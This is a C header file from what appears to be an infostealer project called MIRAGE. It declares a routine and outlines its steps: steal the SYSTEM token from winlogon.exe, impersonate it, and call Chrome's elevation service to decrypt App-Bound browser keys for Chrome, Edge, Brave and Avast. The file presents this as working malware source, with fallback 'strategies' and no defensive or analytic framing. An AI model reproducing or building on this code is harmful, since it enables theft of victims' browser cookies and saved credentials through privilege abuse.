/*
 * elevator.h — SYSTEM impersonation for Chrome App-Bound key decryption
 */
#ifndef MIRAGE_ELEVATOR_H
#define MIRAGE_ELEVATOR_H

#include <stddef.h>
#include <stdint.h>

/* Forward declaration — defined in appbound.h */
typedef enum { APPBOUND_CHROME=0, APPBOUND_EDGE=1, APPBOUND_BRAVE=2, APPBOUND_AVAST=3 } AppBoundBrowser;

/*
 * Impersonate winlogon.exe (SYSTEM) to call COM IElevator,
 * then revert to original token.
 *
 * Steps:
 *   1. FindWindowW("Shell_TrayWnd") → GetWindowThreadProcessId → find winlogon.exe
 *   2. OpenProcessToken → DuplicateTokenEx(SecurityImpersonation)
 *   3. ImpersonateLoggedOnUser
 *   4. Call appbound_decrypt_com (existing)
 *   5. RevertToSelf + close handles
 *
 * Returns 0 on success (key32 filled), -1 on failure.
 * On failure, caller should fall through to other strategies.
 */
int elevate_and_decrypt_key(const unsigned char *enc_key, size_t enc_len,
                            AppBoundBrowser browser, unsigned char *key32);

#endif /* MIRAGE_ELEVATOR_H */
